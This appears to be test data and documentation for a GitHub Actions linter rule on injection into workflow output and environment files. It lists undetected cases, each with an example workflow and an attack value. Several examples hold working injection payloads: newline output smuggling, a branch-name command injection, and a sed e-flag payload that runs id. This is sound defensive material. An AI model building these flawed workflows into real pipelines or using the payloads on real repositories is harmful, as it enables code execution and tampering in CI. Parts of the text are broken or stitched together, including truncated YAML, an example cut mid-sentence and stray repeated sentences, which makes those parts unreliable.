# situation: on issues opened, a step opens descriptor 3 on $GITHUB_OUTPUT

jobs:
  a:
    runs-on: ubuntu-latest

      - env:

          { exec 3>> "$GITHUB_OUTPUT"; }

# situation: on issues opened, a step sets out to /dev/null; in a for loop,
#   the step sets out to $GITHUB_OUTPUT, leaves the loop with break when
#   STOP is empty, and sets out to /dev/null after the break; after the

#   loop ends at the break with out holding $GITHUB_OUTPUT, and the body
#   goes to $GITHUB_OUTPUT.

notes.attack_run_behavior: tr -d '\n' takes the line break out, so echo writes the one line page=xPWNED=1 to $GITHUB_OUTPUT, and the runner sets the output page to xPWNED=1 and no PWNED.

fix_kinds.title: move the expressions into the env of the step and read them as "${NAME}" where they were unquoted (bash and sh), as $env:NAME (pwsh) or as process.env.NAME (github-script); take the line breaks out of what is written to $GITHUB_ENV or $GITHUB_OUTPUT, or make the delimiter of name<<DELIM random

possible_side_effects.text: An unquoted place becomes one word: a value with blanks is no longer read as several words, and outside [[ ]] is no longer globbed.
On the right of ==, =, != or =~ inside [[ ]], the value is compared as a string, not matched as a pattern or a regular expression.
The rule does not read the quoting of pwsh, so how $env:NAME is read at that place is not checked.
The rule does not read the JavaScript of github-script, so how process.env.NAME is read at that place is not checked.
The line breaks of a value written to $GITHUB_ENV or $GITHUB_OUTPUT are taken out, which changes a value that had them.
The random delimiter is made with od and /dev/urandom; in a container without them the step fails.

The value of the ${{ }} expression is no longer parsed by the program that reads the script (the shell, or the JavaScript runtime of actions/github-script) as part of the script text: characters of the value that the program interpreted before the fix (such as $, `, \, double quotes and line breaks) are taken as plain characters, and a workflow that relied on the program interpreting those characters runs differently.

undetected_forms.text: a job that runs only on pull_request, in one of two cases. In the first case, only the pull requests of the repository run the workflow: the author of a pull request can change the workflow itself, so the run of the job gives the author what the run has (read-only from a fork, or what a private repository sends to the runs of pull requests from forks: secrets, a token that writes) without the flaw of the rule, and the flaw of the rule adds nothing to what the author gets. In the second case, a ruleset of the organization or the enterprise runs the workflow on the pull requests of its other repositories (Require workflows to pass before merging, of GitHub Enterprise): the author of such a pull request cannot change the workflow, and whether the run has more than the pull_request workflow of the author would get (the token, secrets) is known from GitHub's documentation only, as no such run was observed; making a required check pass is outside the threat model of the rule. The workflow does not say which case holds, and the rule does not read which case holds

examples.name: pull-request.yml
examples.text:
# situation: on pull_request, a run writes the pull request's body to
#   $GITHUB_OUTPUT.
# reason: when only the pull requests of the repository run the workflow, the
#   author of the pull request can change the workflow itself and gets what the
#   run has without the flaw, so the flaw adds nothing to what the author gets;
#   when a ruleset of the organization or the enterprise runs the workflow on
#   the pull requests of its other repositories, the author cannot change the
#   workflow, and what the run of the ruleset has beyond the author's own
#   pull_request workflow is not known. The workflow does not say which case
#   holds.
# cause: pull_request is none of the attacker's events the rule reads. The
#   rule does not read whether a ruleset runs the workflow.
# attack-value: github.event.pull_request.body = "x\nPWNED=1"
# attack-run-behavior: ${{ }} puts the two lines inside the double quotes of
#   the echo, which writes the lines t=x and PWNED=1 to $GITHUB_OUTPUT, and the
#   runner sets the outputs t and PWNED. When a ruleset of the organization runs
#   the workflow on a pull request of another repository, the same steps run in
#   the run of the ruleset; what the run of the ruleset has was not observed, so
#   whether the steps do harm in the run of the ruleset is not known.
on: pull_request
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "t=${{ github.event.pull_request.body }}" >> "$GITHUB_OUTPUT"

notes.situation: on pull_request, a run writes the pull request's body to $GITHUB_OUTPUT.
notes.reason: when only the pull requests of the repository run the workflow, the author of the pull request can change the workflow itself and gets what the run has without the flaw, so the flaw adds nothing to what the author gets; when a ruleset of the organization or the enterprise runs the workflow on the pull requests of its other repositories, the author cannot change the workflow, and what the run of the ruleset has beyond the author's own pull_request workflow is not known. The workflow does not say which case holds.
notes.cause: pull_request is none of the attacker's events the rule reads. The rule does not read whether a ruleset runs the workflow.
notes.attack_run_behavior: ${{ }} puts the two lines inside the double quotes of the echo, which writes the lines t=x and PWNED=1 to $GITHUB_OUTPUT, and the runner sets the outputs t and PWNED. When a ruleset of the organization runs the workflow on a pull request of another repository, the same steps run in the run of the ruleset; what the run of the ruleset has was not observed, so whether the steps do harm in the run of the ruleset is not known.

undetected_forms.text: a value of the event of workflow_dispatch other than its inputs, in a job that runs only on workflow_dispatch: the event has the ref, which is a branch or a tag that the repository already has, and values that GitHub fills, such as the login of the account that dispatches the workflow; the event has no text of an issue, a comment or a pull request. Whoever dispatches the workflow chooses the ref and the inputs of the dispatch, and nothing else of the event. A token that cannot change the files of the repository can dispatch the workflow, such as a fine-grained token that has the permission Actions with write access and no permission Contents. The rule reports an input of the dispatch with the inconclusive kind input-dispatch

examples.name: dispatch.yml
examples.text:
# situation: on workflow_dispatch, a run writes github.event.issue.body to
#   $GITHUB_OUTPUT. If the workflow also ran on issues, the rule would
#   report the same step.
# reason: no added gain: on workflow_dispatch the event has no issue object,
#   so the expression of the body gives an empty string; whoever dispatches
#   the workflow chooses the ref and the inputs of the dispatch, and the step
#   reads no input of the dispatch.
# cause: the table of the attacker's events that the rule reads does not
#   have workflow_dispatch; the rule reports an input of a dispatch with the
#   inconclusive kind input-dispatch.
# attack-value: github.event.issue.body = "x\nPWNED=1"
# attack-run-behavior: with the value put in, ${{ }} puts the two lines
#   inside the double quotes of the echo, which writes the lines t=x and
#   PWNED=1 to $GITHUB_OUTPUT, and the runner sets the outputs t and PWNED.
#   On workflow_dispatch the event has no issue object, though: the
#   expression gives an empty string, and the script writes the line t=
#   only.
on: workflow_dispatch
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "t=${{ github.event.issue.body }}" >> "$GITHUB_OUTPUT"

notes.reason: no added gain: on workflow_dispatch the event has no issue object, so the expression of the body gives an empty string; whoever dispatches the workflow chooses the ref and the inputs of the dispatch, and the step reads no input of the dispatch.

notes.attack_run_behavior: with the value put in, ${{ }} puts the two lines inside the double quotes of the echo, which writes the lines t=x and PWNED=1 to $GITHUB_OUTPUT, and the runner sets the outputs t and PWNED. On workflow_dispatch the event has no issue object, though: the expression gives an empty string, and the script writes the line t= only.

undetected_forms.text: a value of the client_payload of repository_dispatch (github.event.client_payload): only a credential with write access to the permission Contents of the repository can send repository_dispatch, and the credential premise assumes that no attacker holds such a credential; the sender chooses the whole client_payload

undetected_forms.text: a value that an app outside GitHub Actions writes into a field of a commit status or a check run (the fields context, description and target_url of status; the fields name, output, details_url and external_id of check_run): the app may copy a value of a pull request from a fork into the field, such as the name of a job that a configuration file of the pull request gives to an outside CI; the rule reads the field as a field whose value the app chooses

examples.name: app-written.yml
examples.text:
# situation: on check_run, which an app outside GitHub Actions starts when
#   the app makes a check run for a commit, the job writes the name of the

#   app may copy a value of a pull request from a fork into the name, such
#   as the name of a job that a configuration file of the pull request gives
#   to an outside CI.
# cause: the table of what an attacker controls reads the values that the
#   app writes into a commit status or a check run as the values that the

# attack-run-behavior: an outside CI copies the name of a job from the

    runs-on: ubuntu-latest
    steps:

undetected_forms.text: a workflow on an event of an attacker that puts a value the attacker writes into the client_payload of a repository_dispatch that the workflow sends (gh api with client_payload to the endpoint dispatches, peter-evans/repository-dispatch), and a workflow on repository_dispatch that uses the value: the flaw is in the workflow that sends the repository_dispatch, and the rule does not read what a workflow sends to another workflow

examples.name: .github/workflows/receiver.yml
examples.text:
# situation: sender.yml runs on issues opened, and with the GITHUB_TOKEN
#   sends a repository_dispatch of the type relay whose client_payload has the
#   body of the issue as the value body; receiver.yml runs on that
#   repository_dispatch, and a run writes the value body of the client_payload
#   to $GITHUB_OUTPUT.
# reason: the author of the issue writes the value, and sender.yml relays
#   the value to receiver.yml in a repository_dispatch that a run of the
#   repository sends with a token of the repository; GitHub creates a workflow
#   run for a repository_dispatch sent with the GITHUB_TOKEN, as an exception
#   to the rule that an event that the GITHUB_TOKEN triggers creates no
#   workflow run.
# cause: the rule reads the events of each workflow alone, and does not read
#   what a workflow sends to another workflow as the client_payload of a
#   repository_dispatch.
# attack-value: github.event.issue.body = "x\nPWNED=1"
# attack-run-behavior: the attacker opens an issue whose body is the value;
#   sender.yml sends the value, and in the run of receiver.yml the script
#   writes the lines t=x and PWNED=1 to $GITHUB_OUTPUT, and the runner sets
#   the outputs t and PWNED.
on:
  repository_dispatch:
    types: [relay]
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "t=${{ github.event.client_payload.body }}" >> "$GITHUB_OUTPUT"

others.name: .github/workflows/sender.yml
others.text:
on:
  issues:
    types: [opened]
permissions:
  contents: write
jobs:
  relay:
    runs-on: ubuntu-latest
    steps:
      - env:
          GH_TOKEN: ${{ github.token }}
          VALUE: ${{ github.event.issue.body }}
        run: gh api "repos/$GITHUB_REPOSITORY/dispatches" -f event_type=relay -f "client_payload[body]=$VALUE"

notes.situation: sender.yml runs on issues opened, and with the GITHUB_TOKEN sends a repository_dispatch of the type relay whose client_payload has the body of the issue as the value body; receiver.yml runs on that repository_dispatch, and a run writes the value body of the client_payload to $GITHUB_OUTPUT.
notes.reason: the author of the issue writes the value, and sender.yml relays the value to receiver.yml in a repository_dispatch that a run of the repository sends with a token of the repository; GitHub creates a workflow run for a repository_dispatch sent with the GITHUB_TOKEN, as an exception to the rule that an event that the GITHUB_TOKEN triggers creates no workflow run.
notes.cause: the rule reads the events of each workflow alone, and does not read what a workflow sends to another workflow as the client_payload of a repository_dispatch.
notes.attack_run_behavior: the attacker opens an issue whose body is the value; sender.yml sends the value, and in the run of receiver.yml the script writes the lines t=x and PWNED=1 to $GITHUB_OUTPUT, and the runner sets the outputs t and PWNED.

undetected_forms.text: an input of workflow_dispatch that a caller of the same repository passes, as an input of the call (under the key with: of the calling job or step), to a reusable workflow or a composite action, which uses the input as a value: the one who dispatches the caller chooses the value, and the rule reads the events of a called workflow or action from the table of the callers, and does not follow the value of an input of workflow_dispatch that the caller gives

examples.name: .github/workflows/called.yml
examples.text:
# situation: caller.yml runs on workflow_dispatch with the input x, and
#   calls called.yml with the input x of the dispatch as the input x of
#   called.yml; called.yml writes the input x to $GITHUB_OUTPUT.
# reason: the one who dispatches caller.yml chooses the value:
#   input-dispatch reports such a value where a workflow on workflow_dispatch
#   refers to its input directly, but through the call the value is the input
#   x of called.yml.
# cause: the rule reads the events of a called workflow from the table of
#   the callers, and does not follow the value of an input of
#   workflow_dispatch that a caller gives in with.
# attack-value: inputs.x = "x\nPWNED=1"
# attack-run-behavior: when the one who dispatches caller.yml gives the
#   value as x, the script writes the lines t=x and PWNED=1 to $GITHUB_OUTPUT,
#   and the runner sets the outputs t and PWNED.
on:
  workflow_call:
    inputs:
      x: {type: string}
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "t=${{ inputs.x }}" >> "$GITHUB_OUTPUT"

others.text:
on:
  workflow_dispatch:
    inputs:
      x: {type: string}
jobs:
  call:
    uses: ./.github/workflows/called.yml
    with:
      x: ${{ inputs.x }}
    secrets: inherit

undetected_forms.text: secrets, vars, runner, the outcome of a step, the result of a job. A run of the linter that adds the attacker variables-writer reports a reference of vars where the rule reads the value as written by the attacker, and a run of the linter that adds the attacker secrets-writer reports such a reference of secrets except secrets.GITHUB_TOKEN (--add-attacker); no run reports runner, the outcome of a step or the result of a job

examples.name: not-attacker.yml
examples.text:
# situation: on issues, a run writes secrets, variables and the runner to
#   $GITHUB_OUTPUT.
# reason: no added gain: no attacker writes them.
# cause: the rule reads as what an attacker may write only references to
#   github (through its table of contexts), env, the outputs of steps and of
#   jobs needed, inputs and matrix; secrets, vars and runner are none of
#   these, so it reads them as values no attacker writes.
# attack-value: secrets.TOKEN = "x\nPWNED=1"
# attack-run-behavior: ${{ }} puts the secret's two lines in the script, so
#   echo writes the lines t=x and PWNED=1 followed by the values of vars.NAME
#   and runner.os to $GITHUB_OUTPUT, and the runner sets the outputs t and
#   PWNED.
on: issues
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "t=${{ secrets.TOKEN }} ${{ vars.NAME }} ${{ runner.os }}" >> "$GITHUB_OUTPUT"

notes.situation: on issues, a run writes secrets, variables and the runner to $GITHUB_OUTPUT.
notes.reason: no added gain: no attacker writes them.
notes.cause: the rule reads as what an attacker may write only references to github (through its table of contexts), env, the outputs of steps and of jobs needed, inputs and matrix; secrets, vars and runner are none of these, so it reads them as values no attacker writes.
notes.attack_run_behavior: ${{ }} puts the secret's two lines in the script, so echo writes the lines t=x and PWNED=1 followed by the values of vars.NAME and runner.os to $GITHUB_OUTPUT, and the runner sets the outputs t and PWNED.

undetected_forms.text: a context compared, negated, or given to contains, startsWith, endsWith or hashFiles: what is written out is a bool or a hash

examples.name: compared.yml
examples.text:
# situation: on issues, a run writes to $GITHUB_OUTPUT the issue's body
#   given to contains and compared with ==.
# reason: no added gain: what is written out is a bool.
# cause: the rule reads the value of a comparison or of contains as a bool,
#   not the attacker's text.
# attack-value: github.event.issue.body = "x\nPWNED=1"
# attack-run-behavior: GitHub evaluates contains to true (the body has an x)
#   and == to false, so the step writes the one line t=true false to
#   $GITHUB_OUTPUT, and the runner sets the output t only; the body's lines
#   are not written.
on: issues
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "t=${{ contains(github.event.issue.body, 'x') }} ${{ github.event.issue.body == 'x' }}" >> "$GITHUB_OUTPUT"

notes.situation: on issues, a run writes to $GITHUB_OUTPUT the issue's body given to contains and compared with ==.
notes.reason: no added gain: what is written out is a bool.
notes.cause: the rule reads the value of a comparison or of contains as a bool, not the attacker's text.
notes.attack_run_behavior: GitHub evaluates contains to true (the body has an x) and == to false, so the step writes the one line t=true false to $GITHUB_OUTPUT, and the runner sets the output t only; the body's lines are not written.

undetected_forms.text: a context that cannot hold a line break, written after the = of a line or in the body of name<<DELIM: a SHA, a number, a date, the name of an account, a repository or a branch, the description of a fork (github.event.forkee.description), a URL (before the =, any value an attacker controls is reported)

examples.name: no-line-break.yml
examples.text:
# situation: on pull_request_target, workflow_run, merge_group, fork, and
#   issues and discussion transferred, runs write branches' names, a number
#   and a SHA after the = of lines of $GITHUB_OUTPUT. issues and discussion run only
#   when transferred: changes.new_repository is in the payload of that
#   action alone.
# reason: no added gain: a branch's name cannot hold a line break: "They
#   cannot have ASCII control characters (i.e. bytes whose values are lower
#   than \040, or \177 DEL)" (git-check-ref-format, git v2.51.0). The second
#   step is the form of GHSL-2025-105 (vets-api,
#   https://securitylab.github.com/advisories/GHSL-2025-105_vets-api/),
#   which the advisory reports as code injection: code-injection reports it.
# cause: the rule's table of contexts reads the branches' names as
#   structured (an attacker shapes them within a form without line breaks)
#   and the number and the SHA as fixed. A fixed value is not taken as an
#   attacker's, and a structured one not as written with line breaks; after
#   the =, the rule reports only a value written with line breaks.
# attack-value: github.event.workflow_run.head_branch = "x\";echo${IFS}PWNED=1>>$GITHUB_OUTPUT;#"
# attack-run-behavior: the value has no line break, space or other character
#   git-check-ref-format forbids. The second step's script becomes echo
#   "pr_branch=x";echo${IFS}PWNED=1>>$GITHUB_OUTPUT;#" >> $GITHUB_OUTPUT: the
#   shell prints pr_branch=x, splits echo${IFS}PWNED=1 into echo and PWNED=1
#   and appends the line PWNED=1 to $GITHUB_OUTPUT, and reads the rest as a
#   comment, so the runner sets the output PWNED. A line break, which would
#   set it after the =, cannot be in a branch's name.
# advisory: https://securitylab.github.com/advisories/GHSL-2025-105_vets-api/
on:
  pull_request_target:
  workflow_run:
  merge_group:
  fork:
  issues:
    types: [transferred]
  discussion:
    types: [transferred]
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "h=${{ github.head_ref }} n=${{ github.event.pull_request.number }} s=${{ github.event.pull_request.head.sha }}" >> "$GITHUB_OUTPUT"
      - run: echo "pr_branch=${{ github.event.workflow_run.head_branch }}" >> $GITHUB_OUTPUT
      - run: |
          echo "a=${{ github.event.pull_request.head.ref }}" >> "$GITHUB_OUTPUT"
          echo "b=${{ github.event.pull_request.head.label }}" >> "$GITHUB_OUTPUT"
          echo "c=${{ github.event.pull_request.base.ref }}" >> "$GITHUB_OUTPUT"
          echo "d=${{ github.event.pull_request.base.label }}" >> "$GITHUB_OUTPUT"
          echo "e=${{ github.event.workflow_run.pull_requests[0].head.ref }}" >> "$GITHUB_OUTPUT"
          echo "f=${{ github.event.workflow_run.pull_requests[0].base.ref }}" >> "$GITHUB_OUTPUT"
          echo "g=${{ github.event.workflow_run.referenced_workflows[0].ref }}" >> "$GITHUB_OUTPUT"
          echo "h=${{ github.event.pull_request.head.repo.default_branch }}" >> "$GITHUB_OUTPUT"
          echo "i=${{ github.event.pull_request.base.repo.default_branch }}" >> "$GITHUB_OUTPUT"
          echo "j=${{ github.event.forkee.default_branch }}" >> "$GITHUB_OUTPUT"
          echo "k=${{ github.event.changes.new_repository.default_branch }}" >> "$GITHUB_OUTPUT"
          echo "m=${{ github.event.merge_group.head_ref }}" >> "$GITHUB_OUTPUT"
          echo "n=${{ github.event.merge_group.base_ref }}" >> "$GITHUB_OUTPUT"

The second step is the form of GHSL-2025-105 (vets-api, https://securitylab.github.com/advisories/GHSL-2025-105_vets-api/), which the advisory reports as code injection: code-injection reports it.

A fixed value is not taken as an attacker's, and a structured one not as written with line breaks; after the =, the rule reports only a value written with line breaks.

The second step's script becomes echo "pr_branch=x";echo${IFS}PWNED=1>>$GITHUB_OUTPUT;#" >> $GITHUB_OUTPUT: the shell prints pr_branch=x, splits echo${IFS}PWNED=1 into echo and PWNED=1 and appends the line PWNED=1 to $GITHUB_OUTPUT, and reads the rest as a comment, so the runner sets the output PWNED. undetected_forms.text: a value written through $( ) whose pipeline starts with echo or printf '%s' of it and ends with tr -d with \n in the set, or tr turning \n into another byte

examples.name: line-free.yml
examples.text:
# situation: on issues, a run writes the issue's body to $GITHUB_OUTPUT
#   through $( ) whose pipeline ends with tr -d '\n'.
# reason: no added gain: the line breaks are taken out, so the value is one
#   line.
# cause: the rule reads such a pipeline as taking the line breaks out.
# attack-value: github.event.issue.body = "x\nPWNED=1"
# attack-run-behavior: tr -d '\n' takes the line break out, so echo writes the
#   one line b=xPWNED=1 to $GITHUB_OUTPUT, and the runner sets the output b to
#   xPWNED=1 and no PWNED.
on: issues
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          B: ${{ github.event.issue.body }}
        run: echo "b=$(echo "$B" | tr -d '\n')" >> "$GITHUB_OUTPUT"

notes.situation: on issues, a run writes the issue's body to $GITHUB_OUTPUT through $( ) whose pipeline ends with tr -d '\n'.
notes.reason: no added gain: the line breaks are taken out, so the value is one line.
notes.cause: the rule reads such a pipeline as taking the line breaks out.
notes.attack_run_behavior: tr -d '\n' takes the line break out, so echo writes the one line b=xPWNED=1 to $GITHUB_OUTPUT, and the runner sets the output b to xPWNED=1 and no PWNED.

undetected_forms.text: the body of name<<DELIM whose delimiter is $GHA_DELIM, set before it to ghadelimiter_ and 16 random bytes in hex as the fix writes it

examples.name: random-delimiter.yml
examples.text:
# situation: on issues, a run writes the issue's body to $GITHUB_OUTPUT in
#   b<<DELIM, whose delimiter is ghadelimiter_ and 16 random bytes in hex.
# reason: no added gain: the attacker cannot write the delimiter.
# cause: the rule reads the delimiter of its own fix's form as random.
# attack-value: github.event.issue.body = "x\nghadelimiter_00000000000000000000000000000000\nPWNED=1"
# attack-run-behavior: the step writes b<<$GHA_DELIM, the three lines of the
#   body and $GHA_DELIM, where $GHA_DELIM is ghadelimiter_ and 32 hex digits
#   read from /dev/urandom in the run; the guessed line is not $GHA_DELIM, so
#   the runner reads all three lines as the value of b, closes it at
#   $GHA_DELIM, and sets no PWNED.
on: issues
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          B: ${{ github.event.issue.body }}
        run: |
          GHA_DELIM="ghadelimiter_$(od -An -N16 -tx1 /dev/urandom | tr -d ' \n')"; { echo "b<<${GHA_DELIM}"; echo "$B"; echo "${GHA_DELIM}"; } >> "$GITHUB_OUTPUT"

notes.situation: on issues, a run writes the issue's body to $GITHUB_OUTPUT in b<<DELIM, whose delimiter is ghadelimiter_ and 16 random bytes in hex.
notes.reason: no added gain: the attacker cannot write the delimiter.
notes.cause: the rule reads the delimiter of its own fix's form as random.
notes.attack_run_behavior: the step writes b<<$GHA_DELIM, the three lines of the body and $GHA_DELIM, where $GHA_DELIM is ghadelimiter_ and 32 hex digits read from /dev/urandom in the run; the guessed line is not $GHA_DELIM, so the runner reads all three lines as the value of b, closes it at $GHA_DELIM, and sets no PWNED.

undetected_forms.text: a shell variable no env of the workflow sets: one the script sets (from a file, an artifact, an API), a positional parameter of a function the script calls with the value, or the runner

examples.name: script-var.yml
examples.text:
# situation: a run writes to $GITHUB_OUTPUT a version read out of a release
#   API's body through a variable the script sets
#   (oorabona/docker-containers#1549,
#   https://github.com/oorabona/docker-containers/issues/1549); another
#   writes the issue's title through a positional parameter of a function
#   and an indirection the script sets.
# reason: a todo (the same file): following the variables of the script
#   would find it.
# cause: the value goes through a variable the script sets, which the rule
#   does not follow.
# attack-value: github.event.issue.title = "1.2.3\ncurrent_tag=latest\nPWNED=1"
# attack-run-behavior: the value is the version of
#   oorabona/docker-containers#1549 with the line PWNED=1 added. f and ${!X}
#   each echo the lines a=1.2.3, current_tag=latest and PWNED=1 to
#   $GITHUB_OUTPUT, and the runner sets the outputs a, current_tag and PWNED;
#   the same lines as the tag_name of the release make the first step write
#   version=1.2.3 and the same two outputs.
on: issues
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
          version=$(curl -s https://api.example/releases/latest | jq -r .tag_name)
          echo "version=$version" >> "$GITHUB_OUTPUT"
      # a positional parameter of a function the script calls with the value
      - env:
          T: ${{ github.event.issue.title }}
        run: |
          f() { echo "a=$1" >> "$GITHUB_OUTPUT"; }
          f "$T"
          # the indirection names T through X, which the script sets
          X=T
          echo "a=${!X}" >> "$GITHUB_OUTPUT"

examples.name: script-var.ghsl-2026-229.yml
examples.text:
# situation: on pull_request_target, the step version checks out the file
#   version.json of the head commit of the pull request, reads the version
#   in the file with yq into a variable of the script, and writes the
#   variable to $GITHUB_OUTPUT with echo; the step prev puts the output
#   prefix of the step version into the program of sed. These are the steps
#   of the reusable workflow release-check.yml of
#   ipdxco/unified-github-workflows (commit
#   e08e90c46d931f457e5d8e292ffa988c0c0b5b70, lines 68-103 and 154-184),
#   written in the calling workflow.
# reason: a todo (the same file): following the variable that the script
#   sets from the file would find it.
# cause: the value goes through a variable that the script sets from a file
#   of the pull request, and the rule does not follow the variable.
# attack-value: the version in the file version.json of the pull request = "v0.4.2\nprefix=v\\|.*#id>/dev/stderr#e;#"
# attack-run-behavior: echo writes the lines version=0.4.2 and
#   prefix=v\|.*#id>/dev/stderr#e;# to $GITHUB_OUTPUT, and the runner sets
#   the output prefix to the second value; the step prev then runs sed with
#   the program s#^v\|.*#id>/dev/stderr#e;##v#, whose e flag runs id for
#   each tag that starts with v.
# advisory: https://securitylab.github.com/advisories/GHSL-2026-229_ipdxco_unified-github-workflows/
on:
  pull_request_target:
    paths: [ "version.json" ]
permissions:
  contents: write
  pull-requests: write
jobs:
  release-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - id: version
        env:
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
        run: |
          prefix="v"
          echo "prefix=$prefix" | tee -a $GITHUB_OUTPUT
          git fetch origin "$HEAD_SHA"
          git checkout "$HEAD_SHA" -- version.json
          version="$(yq -r '.version | select(type == "!!str")' version.json)"
          git checkout HEAD -- version.json
          version="${version#v}"
          echo "version=$version" | tee -a $GITHUB_OUTPUT
          echo "tag=${prefix}${version}" | tee -a $GITHUB_OUTPUT
      - id: prev
        env:
          PREFIX: ${{ steps.version.outputs.prefix }}
        run: |
          git fetch origin --tags
          vs=$(git tag | grep "^${PREFIX}" | sed "s#^${PREFIX}#v#" | paste -sd , -)
          echo "vs=$vs"

examples.name: nested-shell.yml
examples.text:
# situation: on issues, a run writes the issue's title to $GITHUB_OUTPUT
#   through eval, bash -c and python -c.
# reason: a todo (the same file): reading what another shell or program
#   writes to the environment file would find it.
# cause: the tree does not read the code of eval, nor that of bash -c
#   written as two words in single quotes, and python reads the value from
#   its environment itself.
# attack-value: github.event.issue.title = "x\nPWNED=1"
# attack-run-behavior: the echo that eval runs, the echo that bash -c runs (T
#   is in its environment) and the print of python3 each write the lines a=x
#   and PWNED=1 to $GITHUB_OUTPUT, and the runner sets the outputs a and
#   PWNED.

jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          T: ${{ github.event.issue.title }}
        run: |
          eval 'echo "a=$T" >> "$GITHUB_OUTPUT"'
          bash -c 'echo "a=$T"'' >> "$GITHUB_OUTPUT"'
          python3 -c 'import os; print("a=" + os.environ["T"])' >> "$GITHUB_OUTPUT"

# situation: on issues opened, a step turns lastpipe on with shopt -s and
#   the option name in a variable, sets out to $GITHUB_OUTPUT in the last command
#   of a pipeline, and writes v=$V to "$out".
# reason: a todo (the same file): with lastpipe, bash runs the last command
#   of the pipeline in the shell itself, so out stays $GITHUB_OUTPUT after the
#   pipeline and the value goes to $GITHUB_OUTPUT.
# cause: the rule follows lastpipe only after shopt -s lastpipe written as
#   literal words, and reads the last command as a command in a subshell.
# attack-value: github.event.issue.body = "x\nPWNED=1"
# attack-run-behavior: the value goes to $GITHUB_OUTPUT.
on:
  issues:
    types: [opened]
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          V: ${{ github.event.issue.body }}
        run: |
          o=lastpipe
          shopt -s "$o"
          true | out=$GITHUB_OUTPUT
          echo "v=$V" >> "$out"
